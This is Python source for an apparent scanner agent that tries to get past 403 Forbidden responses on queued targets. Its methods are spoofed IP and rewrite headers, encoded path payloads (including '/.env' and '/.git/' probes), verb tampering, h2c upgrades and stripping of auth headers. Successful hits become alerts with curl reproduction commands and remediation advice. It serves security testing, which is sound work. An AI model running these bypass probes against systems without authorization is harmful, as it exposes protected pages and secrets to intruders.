import asyncio
import datetime
import logging
import json
import os
import httpx
from base_agent import BaseAgent, logger

# ---------------------------------------------------------------------------
# HTTP verbs used for verb-tampering probes  (Enhancement #1)
# ---------------------------------------------------------------------------
_TAMPER_VERBS = ["POST", "HEAD", "PATCH", "PUT", "OPTIONS", "DELETE", "TRACE"]

# Auth/session-like headers that hop-by-hop stripping targets  (Enhancement #3)
_HOP_BY_HOP_TARGETS = [
    "Authorization",
    "X-Auth-Token",
    "X-Api-Key",
    "Cookie",
    "X-Csrf-Token",
    "X-Access-Token",
    "X-Session-Id",
    "Proxy-Authorization",
]


class Bypass403Agent(BaseAgent):
    def __init__(self):
        super().__init__("bypass_403", "403 Forbidden Bypasser")
        self.headers_to_test = [
            # Localhost / loopback spoofing
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "::1"},
            {"X-Forwarded-For": "0.0.0.0"},
            {"X-Forwarded-For": "10.0.0.1"},
            {"X-Forwarded-For": "192.168.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "8.8.8.8"},
            {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost"},
            # URL-rewrite headers
            {"X-Original-URL": "/"},   # populated per-path in test_bypass
            {"X-Rewrite-URL": "/"},
            # Trusted proxy / internal markers
            {"True-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
        ]
        # Path payloads inspired by BurpSuite_403Bypasser variations
        self.path_payloads = [
            "/%2e/", "/./", "/..;/", "/%2f/", "//",
            "/??", "/#",
            "/.html", "/.php", "/.json", "/.jsp", "/.ashx", "/.aspx",
            "/%20/", "/admin/..;/", "/.;/", "/..%2f", "/%2e%2e%2f",
            # Additional encoding variations
            "/%252f/", "/%u002f/", "/;/", "/%3b/",
            "/.git/", "/.env",
        ]

    async def test_bypass(self, base_url, path):
        """Iterate through all bypass techniques for a specific path."""
        target_path = path.lstrip("/")
        full_url = f"{base_url}/{target_path}".rstrip("/")

        results = []

        async with httpx.AsyncClient(verify=False, timeout=10.0, follow_redirects=False, headers={"User-Agent": self.user_agent}) as client:
            # 1. Header-based IP / origin spoofing
            for header in self.headers_to_test:
                # Patch path-specific rewrite headers
                effective_header = dict(header)
                for k in ("X-Original-URL", "X-Rewrite-URL"):
                    if k in effective_header:
                        effective_header[k] = f"/{target_path}"
                try:
                    resp = await client.get(full_url, headers=effective_header)
                    if resp.status_code < 400:
                        results.append({
                            "type": "header",
                            "payload": str(effective_header),
                            "status": resp.status_code,
                            "url": full_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split()),
                        })
                except Exception as e:
                    logger.debug(f"Header test failed: {e}")

            # 2. Path normalisation / variation bypass
            variations = [
                f"{full_url}/.",
                f"{full_url}//",
                f"{full_url}/./",
                f"{full_url}%20/",
                f"{full_url}?",
                f"{full_url}???",
                f"{full_url}/.random",
                f"{full_url}%09",
                f"{full_url};/",
            ]
            for mod_url in variations:
                try:
                    resp = await client.get(mod_url)
                    if resp.status_code < 400:
                        results.append({
                            "type": "path_variation",
                            "payload": mod_url.replace(full_url, ""),
                            "status": resp.status_code,
                            "url": mod_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split()),
                        })
                except Exception as e:
                    logger.debug(f"Path variation test failed: {e}")

            for payload in self.path_payloads:
                modified_url = f"{base_url}{payload}{target_path}"
                try:
                    resp = await client.get(modified_url)
                    if resp.status_code < 400:
                        results.append({
                            "type": "path_prefix",
                            "payload": payload,
                            "status": resp.status_code,
                            "url": modified_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split()),
                        })
                except Exception as e:
                    logger.debug(f"Path prefix test failed: {e}")

            # 3. URL-rewrite header bypass
            rewrite_headers = [
                {"X-Original-URL": f"/{target_path}"},
                {"X-Rewrite-URL": f"/{target_path}"},
                {"Referer": f"/{target_path}"},
            ]
            for rw_header in rewrite_headers:
                try:
                    resp = await client.get(base_url, headers=rw_header)
                    if resp.status_code < 400:
                        results.append({
                            "type": "rewrite",
                            "payload": str(rw_header),
                            "status": resp.status_code,
                            "url": base_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split()),
                        })
                except Exception as e:
                    logger.debug(f"Rewrite test failed: {e}")

            # 4. HTTP Verb Tampering  (Enhancement #1)
            verb_results = await self._test_verb_tampering(client, full_url, target_path)
            results.extend(verb_results)

            # 5. Protocol Downgrade / Upgrade Auditing  (Enhancement #2)
            proto_results = await self._test_protocol_variants(full_url)
            results.extend(proto_results)

            # 6. Hop-by-Hop Header Stripping  (Enhancement #3)
            hop_results = await self._test_hop_by_hop(client, full_url)
            results.extend(hop_results)

        return results

    # -----------------------------------------------------------------------
    # Enhancement #1 – HTTP Verb Tampering
    # -----------------------------------------------------------------------
    async def _test_verb_tampering(self, client: httpx.AsyncClient, full_url: str, target_path: str) -> list:
        """
        Re-issue the forbidden request using alternative HTTP verbs.
        Reverse proxies and ACLs often only restrict GET; other methods
        (POST, HEAD, PATCH, PUT, OPTIONS, DELETE) may slip through.
        Also tests the X-HTTP-Method-Override header trick.
        """
        results = []

        for verb in _TAMPER_VERBS:
            try:
                resp = await client.request(verb, full_url)
                # HEAD returns no body – treat any non-403/non-404 as a signal
                status_ok = resp.status_code < 400
                if status_ok:
                    results.append({
                        "type": "verb_tampering",
                        "payload": f"HTTP Method: {verb}",
                        "status": resp.status_code,
                        "url": full_url,
                        "content": resp.text if verb != "HEAD" else "(HEAD – no body)",
                        "length": len(resp.content),
                        "words": len(resp.text.split()) if verb != "HEAD" else 0,
                    })
            except Exception as e:
                logger.debug(f"Verb tamper ({verb}) failed: {e}")

        # X-HTTP-Method-Override: send GET but tell the server it is POST/PUT
        for override_verb in ["POST", "PUT", "PATCH", "DELETE"]:
            for override_header in ("X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"):
                try:
                    resp = await client.get(full_url, headers={override_header: override_verb})
                    if resp.status_code < 400:
                        results.append({
                            "type": "verb_override_header",
                            "payload": f"{override_header}: {override_verb}",
                            "status": resp.status_code,
                            "url": full_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split()),
                        })
                except Exception as e:
                    logger.debug(f"Method override header test failed: {e}")

        return results

    # -----------------------------------------------------------------------
    # Enhancement #2 – Protocol Downgrade / Upgrade Auditing
    # -----------------------------------------------------------------------
    async def _test_protocol_variants(self, full_url: str) -> list:
        """
        Test the same URL over different HTTP protocol variants:
          - HTTP/1.0 explicit downgrade (via httpx http1=True, http2=False)
          - h2c (HTTP/2 cleartext) upgrade request (Upgrade: h2c header)
          - Native HTTP/2 where available (httpx http2=True)

        WAFs and reverse proxies can behave differently across protocol
        versions, exposing translation or parsing discrepancies.
        """
        results = []

        # --- HTTP/1.0 explicit downgrade ---
        # httpx does not directly speak HTTP/1.0, but we can approximate by
        # sending the version header and disabling keep-alive.
        try:
            async with httpx.AsyncClient(
                verify=False, timeout=10.0, follow_redirects=False,
                http1=True, http2=False,
                headers={"User-Agent": self.user_agent}
            ) as c10:
                resp = await c10.get(full_url, headers={"Connection": "close"})
                if resp.status_code < 400:
                    results.append({
                        "type": "protocol_downgrade",
                        "payload": "HTTP/1.1 with Connection: close (HTTP/1.0 approximation)",
                        "status": resp.status_code,
                        "url": full_url,
                        "content": resp.text,
                        "length": len(resp.content),
                        "words": len(resp.text.split()),
                    })
        except Exception as e:
            logger.debug(f"Protocol downgrade test failed: {e}")

        # --- h2c Upgrade (cleartext HTTP/2) ---
        # Send an Upgrade: h2c request; some proxies pass it to the backend
        # unchanged, exposing the backend's HTTP/2 handler directly.
        try:
            async with httpx.AsyncClient(
                verify=False, timeout=10.0, follow_redirects=False,
                http1=True, http2=False,
                headers={"User-Agent": self.user_agent}
            ) as ch2c:
                h2c_headers = {
                    "Upgrade": "h2c",
                    "HTTP2-Settings": "AAMAAABkAAQAAP__",  # standard base64 settings frame
                    "Connection": "Upgrade, HTTP2-Settings",
                }
                resp = await ch2c.get(full_url, headers=h2c_headers)
                # 101 Switching Protocols or any 2xx/3xx is noteworthy
                if resp.status_code < 400 or resp.status_code == 101:
                    results.append({
                        "type": "protocol_upgrade_h2c",
                        "payload": "Upgrade: h2c (HTTP/2 cleartext upgrade)",
                        "status": resp.status_code,
                        "url": full_url,
                        "content": resp.text,
                        "length": len(resp.content),
                        "words": len(resp.text.split()),
                    })
        except Exception as e:
            logger.debug(f"h2c upgrade test failed: {e}")

        # --- Native HTTP/2 (TLS ALPN negotiation) ---
        if full_url.startswith("https://"):
            try:
                async with httpx.AsyncClient(
                    verify=False, timeout=10.0, follow_redirects=False,
                    http1=False, http2=True,
                    headers={"User-Agent": self.user_agent}
                ) as ch2:
                    resp = await ch2.get(full_url)
                    if resp.status_code < 400:
                        results.append({
                            "type": "protocol_http2_native",
                            "payload": "Native HTTP/2 (ALPN h2)",
                            "status": resp.status_code,
                            "url": full_url,
                            "content": resp.text,
                            "length": len(resp.content),
                            "words": len(resp.text.split()),
                        })
            except Exception as e:
                logger.debug(f"Native HTTP/2 test failed: {e}")

        return results

    # -----------------------------------------------------------------------
    # Enhancement #3 – Hop-by-Hop Header Stripping
    # -----------------------------------------------------------------------
    async def _test_hop_by_hop(self, client: httpx.AsyncClient, full_url: str) -> list:
        """
        In multi-proxy chains an upstream proxy that sees:
            Connection: close, Authorization
        will strip the listed headers before forwarding the request to the
        backend.  If the backend trusts the proxy to have already validated
        the stripped header, the check is bypassed.

        We probe each common auth/session header individually and also in
        combined form to maximise coverage.
        """
        results = []

        for target_header in _HOP_BY_HOP_TARGETS:
            # Single-header stripping attempt
            hop_headers = {
                "Connection": f"close, {target_header}",
            }
            try:
                resp = await client.get(full_url, headers=hop_headers)
                if resp.status_code < 400:
                    results.append({
                        "type": "hop_by_hop_strip",
                        "payload": f"Connection: close, {target_header} (stripping {target_header})",
                        "status": resp.status_code,
                        "url": full_url,
                        "content": resp.text,
                        "length": len(resp.content),
                        "words": len(resp.text.split()),
                    })
            except Exception as e:
                logger.debug(f"Hop-by-hop strip ({target_header}) failed: {e}")

        # Combined: strip multiple auth headers at once
        combined_targets = ", ".join(_HOP_BY_HOP_TARGETS[:4])
        try:
            resp = await client.get(full_url, headers={"Connection": f"close, {combined_targets}"})
            if resp.status_code < 400:
                results.append({
                    "type": "hop_by_hop_strip_combined",
                    "payload": f"Connection: close, {combined_targets} (multi-header strip)",
                    "status": resp.status_code,
                    "url": full_url,
                    "content": resp.text,
                    "length": len(resp.content),
                    "words": len(resp.text.split()),
                })
        except Exception as e:
            logger.debug(f"Hop-by-hop combined strip failed: {e}")

        # TE-based hop-by-hop: Transfer-Encoding as a hop header
        try:
            resp = await client.get(full_url, headers={
                "Connection": "close, Transfer-Encoding",
                "Transfer-Encoding": "chunked",
            })
            if resp.status_code < 400:
                results.append({
                    "type": "hop_by_hop_te",
                    "payload": "Connection: close, Transfer-Encoding (TE hop-by-hop stripping)",
                    "status": resp.status_code,
                    "url": full_url,
                    "content": resp.text,
                    "length": len(resp.content),
                    "words": len(resp.text.split()),
                })
        except Exception as e:
            logger.debug(f"TE hop-by-hop test failed: {e}")

        return results

    async def create_bypass_alert(self, root_domain, target, finding):
        """Create a high-risk alert for a successful 403 bypass."""
        # Map technique type to a human-readable label
        _type_labels = {
            "header":                    "IP/Origin Header Spoofing",
            "path_variation":            "Path Normalisation Bypass",
            "path_prefix":               "Path Prefix Injection",
            "rewrite":                   "URL Rewrite Header Bypass",
            "verb_tampering":            "HTTP Verb Tampering",
            "verb_override_header":      "HTTP Method Override Header",
            "protocol_downgrade":        "Protocol Downgrade (HTTP/1.0)",
            "protocol_upgrade_h2c":      "Protocol Upgrade (h2c cleartext HTTP/2)",
            "protocol_http2_native":     "Native HTTP/2 Protocol Switch",
            "hop_by_hop_strip":          "Hop-by-Hop Header Stripping",
            "hop_by_hop_strip_combined": "Hop-by-Hop Combined Header Stripping",
            "hop_by_hop_te":             "Transfer-Encoding Hop-by-Hop Stripping",
        }
        technique_label = _type_labels.get(finding["type"], finding["type"])

        title = f"SECURITY CRITICAL: 403 Bypass Success on {target}"
        risk  = "high"

        content_snippet = (
            (finding["content"][:500] + "...")
            if len(finding["content"]) > 500
            else finding["content"]
        )

        details = (
            f"A successful 403 Forbidden bypass was detected.\n\n"
            f"Target Path:      {finding['url']}\n"
            f"Technique Type:   {technique_label}\n"
            f"Payload/Header:   {finding['payload']}\n"
            f"Resulting Status: {finding['status']}\n\n"
            f"### Response Content Snippet\n```html\n{content_snippet}\n```"
        )

        # Build technique-specific curl reproduction commands
        if finding["type"] == "verb_tampering":
            verb = finding["payload"].replace("HTTP Method: ", "")
            curl_cmd = f"curl -k -v -X {verb} {finding['url']}"
        elif finding["type"] == "verb_override_header":
            curl_cmd = f"curl -k -v -H \"{finding['payload']}\" {finding['url']}"
        elif finding["type"] == "protocol_upgrade_h2c":
            curl_cmd = (
                f"curl -k -v --http1.1 "
                f"-H 'Upgrade: h2c' -H 'Connection: Upgrade, HTTP2-Settings' "
                f"-H 'HTTP2-Settings: AAMAAABkAAQAAP__' {finding['url']}"
            )
        elif finding["type"] == "protocol_http2_native":
            curl_cmd = f"curl -k -v --http2 {finding['url']}"
        elif finding["type"].startswith("hop_by_hop"):
            # Strip annotation in parentheses for the curl header value
            hop_header = finding["payload"].split("(")[0].strip()
            curl_cmd = f"curl -k -v -H \"{hop_header}\" {finding['url']}"
        else:
            curl_cmd = f"curl -k -v -H \"{finding['payload']}\" {finding['url']}"

        exploitation = (
            f"### Bypass Exploitation & Verification\n\n"
            f"1. **Manual Verification** – replicate with curl:\n"
            f"   `{curl_cmd}`\n"
            f"2. **Assess Exposure** – determine what data or functionality was protected by the 403.\n"
            f"3. **Remediation** – enforce access control at the application layer, not only at the "
            f"reverse proxy or WAF level."
        )

        description = f"Successful 403 bypass via {technique_label}."
        await self.create_alert(
            title, description, target, risk, details, exploitation,
            alert_type="bypass_403_success",
        )


    async def process_tasks(self):
        task = await self.get_next_task("bypass_403")

        if not task:
            return

        target = task["target"]
        root_domain = task["root_domain"]
        forbidden_path = task["path"]
        base_url = task["base_url"]

        try:
            logger.info(f"Starting 403 bypass attempts on {base_url}/{forbidden_path}")
            all_bypasses = await self.test_bypass(base_url, forbidden_path)
            
            if all_bypasses:
                # Identify catch-all patterns (False Positives)
                # We group by (status, length, words) fingerprint
                fingerprints = {}
                for b in all_bypasses:
                    fp = (b['status'], b.get('length', 0), b.get('words', 0))
                    fingerprints[fp] = fingerprints.get(fp, 0) + 1
                
                # Threshold: if many techniques yield same response, it's likely just a generic error page
                catch_all_fps = {fp for fp, count in fingerprints.items() if count > 3}
                
                successful_bypasses = []
                for b in all_bypasses:
                    b_fp = (b['status'], b.get('length', 0), b.get('words', 0))
                    if b_fp not in catch_all_fps:
                        successful_bypasses.append(b)
                    else:
                        logger.debug(f"Suppressing 403 bypass alert for redundant fingerprint: {b_fp}")

                if successful_bypasses:
                    logger.info(f"FOUND {len(successful_bypasses)} unique bypasses for {target}/{forbidden_path}!")
                    for finding in successful_bypasses:
                        await self.create_bypass_alert(root_domain, target, finding)
                
                # Update web_applications with bypass findings (still store all for reference, but maybe only unique ones)
                domain_doc = await self.domains_col.find_one({"domain": root_domain})
                if domain_doc:
                    web_apps = domain_doc.get("web_applications", [])
                    for app in web_apps:
                        if app.get("target") == target:
                            bypasses = app.get("403_bypasses", [])
                            # Simple deduplication by payload
                            existing_payloads = [b['payload'] for b in bypasses]
                            for b in all_bypasses: # Store all in the domain doc for completeness, or just unique? Let's do all.
                                if b['payload'] not in existing_payloads:
                                    bypasses.append(b)
                            app["403_bypasses"] = bypasses
                            break
                    
                    await self.domains_col.update_one(
                        {"domain": root_domain},
                        {"$set": {"web_applications": web_apps}}
                    )
            else:
                logger.info(f"No successful bypasses for {target}/{forbidden_path}")

            await self.tasks_col.update_one(
                {"_id": task["_id"]},
                {"$set": {"status": "completed", "completed_at": datetime.datetime.utcnow()}}
            )
            await self.check_completion(root_domain)

        except Exception as e:
            logger.error(f"Error in 403 bypass for {target}: {e}")
            await self.tasks_col.update_one(
                {"_id": task["_id"]},
                {"$set": {"status": "failed", "error": str(e)}}
            )

if __name__ == "__main__":
    print("--- 403 Bypasser Agent Starting ---")
    agent = Bypass403Agent()
    asyncio.run(agent.main_loop())
